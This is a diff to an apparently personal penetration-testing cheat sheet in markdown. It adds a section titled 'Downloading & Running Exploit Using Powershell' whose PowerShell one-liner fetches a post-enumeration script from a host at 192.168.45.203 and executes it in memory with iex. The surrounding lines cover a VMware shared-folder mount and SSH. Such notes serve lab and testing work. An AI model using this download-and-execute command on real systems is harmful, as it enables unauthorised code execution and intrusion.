@@ -12,6 +12,16 @@ sudo vmhgfs-fuse .host:/ /mnt/hgfs/ -o allow_other -o uid=1000
 
 <details>
 
+<summary>Downloading &#x26; Running Exploit Using Powershell</summary>
+
+```powershell
+powershell -c "$r = iwr http://192.168.45.203/post_enum.ps1 -UseBasicParsing; $s = (New-Object System.IO.StreamReader($r.RawContentStream)).ReadToEnd(); iex $s"
+```
+
+</details>
+
+<details>
+
 <summary>SSH Legacy Connect</summary>
 
 ```bash
